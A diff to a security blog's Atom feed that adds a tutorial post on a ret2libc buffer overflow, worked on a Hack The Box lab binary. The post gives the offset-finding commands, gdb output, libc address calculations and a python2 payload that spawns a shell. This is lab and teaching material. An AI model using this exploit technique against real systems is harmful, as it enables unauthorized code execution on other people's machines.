@@ -4,13 +4,173 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-01-31T14:04:20+08:00</updated>
+ <updated>2022-02-01T16:40:55+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Ret2libc - system()</title>
+   <link href="https://mvineza.github.io/spindel/2022/02/01/ret2libc-system"/>
+   <updated>2022-02-01T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/02/01/Ret2libc-system</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;This makes use of existing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc&lt;/code&gt; by calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;)&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;You can use this attack on the following scenarios:
+    &lt;ul&gt;
+      &lt;li&gt;NX bit is set (e.g it it SEGFAULTS on NOPs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x90909090&lt;/code&gt;)&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GNU_STACK&lt;/code&gt; doesn’t contain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RWE&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readelf -l ./app&lt;/code&gt; output&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Example below is from HTB Frolic box&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;sample-program&quot;&gt;Sample Program&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  loot ./rop hello                                                                                      
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Message sent: hello                                                                            ➜  loot 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Find what buffer length program crashes&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  loot ./rop &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;python2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print('A'*100)&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;                                                              
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1]    325422 segmentation fault  ./rop &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;python2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print('A'*100)&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+➜  loot 
+
+&lt;span class=&quot;c&quot;&gt;# it crashes at about 100 characters&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Find the exact locaton of EIP&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  loot /usr/share/metasploit-framework/tools/exploit/pattern_create.rb &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 100
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+➜  loot 
+➜  loot gdb ./rop
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...redacted...]
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disas vuln
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...redacted...]
+   0x08048508 &amp;lt;+16&amp;gt;:	call   0x8048350 &amp;lt;strcpy@plt&amp;gt;
+   0x0804850d &amp;lt;+21&amp;gt;:	add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...redacted...]
+   0x08048531 &amp;lt;+57&amp;gt;:	ret    
+End of assembler dump.
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; br &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;vuln+16
+Breakpoint 1 at 0x8048508
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; br &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;vuln+21
+Breakpoint 2 at 0x804850d
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Starting program: /home/kali/data/practice/hack_the_box/linux/frolic/results/frolic/loot/rop Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Breakpoint 1, 0x08048508 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;vuln &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; c
+Continuing.
+
+Breakpoint 2, 0x0804850d &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;vuln &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; info frame
+Stack level 0, frame at 0xffffce20:
+ eip &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x804850d &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;vuln&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; saved eip &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x62413762
+ called by frame at 0xffffce24
+ Arglist at 0xffffce18, args: 
+ Locals at 0xffffce18, Previous frame&lt;span class=&quot;s1&quot;&gt;'s sp is 0xffffce20
+ Saved registers:
+  ebp at 0xffffce18, eip at 0xffffce1c
+(gdb) quit
+[...redacted...]
+➜  loot /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762
+[*] Exact match at offset 52
+➜  loot 
+
+# EIP offset is 52
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Find base address of libc&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  loot ldd ./rop          
+	linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xf7fcf000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xf7dbc000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+	/lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xf7fd1000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+➜  loot 
+
+&lt;span class=&quot;c&quot;&gt;# libc_base_addr = 0xf7dbc000&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Find address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system()&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  loot readelf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;system
+  1561: 00045160    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0
+➜  loot 
+
+&lt;span class=&quot;c&quot;&gt;# system_addr = libc_base_addr + 00045160&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#             = 0xf7e01160&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Find address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exit()&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  loot readelf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 | &lt;span class=&quot;nb&quot;&gt;grep exit
+   &lt;/span&gt;152: 00037af0    33 FUNC    GLOBAL DEFAULT   14 &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;@@GLIBC_2.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...redacted...]
+➜  loot 
+
+&lt;span class=&quot;c&quot;&gt;# exit_addr = libc_base_addr + 00037af0&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#           = 0xf7df3af0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Find address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  loot strings &lt;span class=&quot;nt&quot;&gt;-tx&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;
+ 18f924 /bin/sh
+➜  loot 
+
+&lt;span class=&quot;c&quot;&gt;# bin_sh_addr = libc_base_addr + 18f924&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#             = F7F4B924&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Construct payload&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# NOP + system_addr + exit_addr + bin_sh_addr&lt;/span&gt;
+python2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print('A'*52 + '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f7' + '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;df&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f7' + '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f7')&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Run and enjoy&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  loot ./rop &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;python2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print('A'*52 + '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f7' + '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;df&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f7' + '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f7')&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,20&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dialout&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,24&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cdrom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,25&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;floppy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,27&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,29&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;audio&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,30&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,44&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;video&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,46&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plugdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,109&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;netdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,118&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bluetooth&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,120&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wireshark&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,134&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,142&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kaboxer&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;gotchas&quot;&gt;Gotchas&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;If you tried the steps above by getting a copy of vulnerable program and testing it on your local or attacker machine, you might need to change the memory addresses (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc_base_addr&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system_addr&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bin_sh_addr&lt;/code&gt;) once you run it on the victim machine. That’s because memory address on victim might be different from the attacker machine.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://ironhackers.es/en/tutoriales/introduccion-al-exploiting-parte-4-ret2libc-stack-6-protostar/&quot;&gt;Introduction to exploiting Part 4 – ret2libc – Stack6 (Protostar)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://shellblade.net/files/docs/ret2libc.pdf&quot;&gt;Performing a ret2libc Attack - defeating a non-executable stack&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Wordpress</title>
